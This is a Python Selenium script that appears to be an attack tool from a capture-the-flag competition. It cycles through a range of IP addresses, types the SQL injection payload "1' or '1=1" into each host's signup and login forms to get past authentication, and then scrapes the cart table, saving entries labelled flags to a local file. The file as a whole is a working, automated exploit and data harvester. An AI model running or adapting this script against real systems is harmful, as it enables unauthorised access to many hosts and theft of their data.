from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import Select
from getpass import getpass
import time

import base64
import os

chrome_options = Options()
prefs = {"profile.managed_default_content_settings.images": 2}
chrome_options.add_experimental_option("prefs", prefs)
chrome_options.add_argument("--headless")
    
for i in range(200, 255):
    try:
        driver = webdriver.Chrome(executable_path=r'chromedriver.exe', chrome_options=chrome_options)

        print('Getting flags from 168.119.163.{}'.format(i))
        
        driver.get('http://168.119.163.{}:5200/signup'.format(i))

        driver.find_element_by_xpath('/html/body/form/input[1]').send_keys('1\' or \'1=1')

        driver.find_element_by_xpath('/html/body/form/input[2]').send_keys('1\' or \'1=1')

        driver.find_element_by_xpath('/html/body/form/input[3]').send_keys('1\' or \'1=1')

        driver.find_element_by_xpath('/html/body/form/div/input').click()

        driver.get('http://168.119.163.{}:5200/login'.format(i))

        driver.find_element_by_xpath('/html/body/form/input[1]').send_keys('1\' or \'1=1')

        driver.find_element_by_xpath('/html/body/form/input[2]').send_keys('1\' or \'1=1')

        driver.find_element_by_xpath('/html/body/form/div/input').click()

        driver.get('http://168.119.163.{}:5200/show_cart'.format(i))

        table_id = driver.find_element_by_xpath('/html/body/blockquote/blockquote/blockquote/blockquote/blockquote/blockquote/blockquote/blockquote/blockquote/blockquote/blockquote/blockquote/blockquote/blockquote/table')

        tbody = table_id.find_element_by_tag_name('tbody')

        rows = table_id.find_elements_by_tag_name('tr')

        myFile = open('flags.txt', 'a') 

        for row in rows:
            col = row.find_elements_by_tag_name('td')[2]
            print(col.text, file=myFile)

        myFile.close()

    except:
        driver.close()